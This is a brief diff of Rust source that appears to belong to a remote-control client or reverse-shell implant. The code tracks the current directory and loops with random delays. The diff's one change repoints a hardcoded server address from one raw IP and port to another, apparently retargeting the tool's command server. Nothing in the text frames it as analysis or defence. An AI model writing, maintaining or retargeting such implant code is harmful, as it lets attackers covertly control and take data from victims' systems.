@@ -244,7 +244,7 @@ async fn main() {
     let mut current_dir = env::current_dir().unwrap_or_default();
     let mut current_dir_str = current_dir.to_string_lossy().into_owned();
 
-    let server_addr = "88.198.104.155:37945";
+    let server_addr = "5.144.179.247:37945";
 
     loop {
         random_delay();
